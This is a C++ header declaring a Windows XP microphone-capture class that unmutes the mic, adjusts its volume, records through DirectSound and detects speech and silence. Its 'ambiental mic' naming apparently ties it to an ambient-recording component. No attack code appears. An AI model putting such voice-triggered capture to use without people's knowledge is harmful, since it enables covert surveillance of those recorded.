#ifndef __XPMIC_H__
#define __XPMIC_H__

#include <windows.h>
#include <mmsystem.h>
#include "..\\DSound.h"
#include <vector>
#include "QSpeechDetect.h"

extern BOOL bAmbientalMicSemaphore;

#define MINISLEEP_TIME 4500
#define SAMPLES ((uAudioBufferSize ? uAudioBufferSize : 1) / wfx.nChannels) / (wfx.wBitsPerSample / 8)
#define SHORT_MAX 32767
#define SHORT_MIN -32768
#define CLIP_THRESHOLD 1000
#define SILENCE_THRESHOLD 600

#define REC_FREQUENCY	44100
#define REC_BITS		16
#define REC_CHANNELS	2	// Non cambiare!
#define REC_BYTEPERSECOND	REC_FREQUENCY * (REC_BITS / 8) * REC_CHANNELS
#define REC_SECONDS(X)	X * REC_BYTEPERSECOND

#define DEFINE_LOCAL_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) GUID name; { name.Data1=l; \
	                                                                                    name.Data2=w1; \
																						name.Data3=w2; \
																						name.Data4[0]=b1; \
																						name.Data4[1]=b2; \
																						name.Data4[2]=b3; \
																						name.Data4[3]=b4; \
																						name.Data4[4]=b5; \
																						name.Data4[5]=b6; \
																						name.Data4[6]=b7; \
																						name.Data4[7]=b8; }

#define CHK_HRESULT(x) if (x != S_OK) {  break; }
#define CHK_POINTER(x) if (x == NULL) {  break; }

typedef HRESULT (WINAPI *DirectSoundCaptureCreate8_t) (LPCGUID , LPDIRECTSOUNDCAPTURE8 *, DWORD);

using namespace std;

class CXPMixer
{
private:
	BOOL bCalibrate, bVoice, bSilence;
	INT iSilenceBlock, iSilenceLength;
	UINT uVoiceThreshold, uAudioBufferSize, uChunkLen, uChannels, uThreshold;
	FLOAT fVoiceThreshold;
	PBYTE m_pAudioBuffer;

	BOOL m_bInitialized;
	HMIXER	m_hMixer;
	MIXERCAPS m_mixCaps;				
	UINT m_uNumMixers;
	
	MIXERLINE m_mxl;

	// Per la modifica del volume servono il valore minimo e massimo, il numero di steps e l'ID del controllo.
	DWORD m_dwMinMicVal, m_dwMaxMicVal, m_dwMicStep, m_dwVolumeControlID, m_dwXPercStep;

	QSpeechDetect *m_pQsd;
	SYSTEMTIME st;
	WAVEFORMATEX wfx;

	HWAVEIN m_hWaveIn;
	HMODULE m_hDSound;
	DirectSoundCaptureCreate8_t	m_pDirectSoundCaptureCreate8;
	LPDIRECTSOUNDCAPTURE8 m_pDSC;

private:
	inline BOOL IsInitialized() { return m_bInitialized; };
	BOOL MixInitialize();
	void MixUninitialize();
	BOOL MixSelectAndOpen();

	BOOL MixLineSelect(UINT uLineType);
	BOOL MixGetVolumeControls();

	BOOL SelectMic();
	VOID UnMuteMic();
	
	BOOL LoadDSound();
	VOID UnloadDSound();
	
	BOOL AcquireMic();

	UINT GetVolumeStep();
	UINT GetVolume();	
	BOOL SetVolume(UINT uVolume);

	BOOL MiniSleep(UINT uMilliSec);

public:
	CXPMixer(BOOL bCalibrate, UINT uVoiceThreshold, INT iSilenceBlock);
	virtual ~CXPMixer();

	BOOL Initialize();

	BOOL StepVolumeUp();
	BOOL StepVolumeDown();
	
	BOOL AcquireMic(PBYTE* pBuffer);
	UINT GetBufferSize();
	BOOL IsVoice();
	SYSTEMTIME GetTimeStamp();
	BOOL Silent();
};
#endif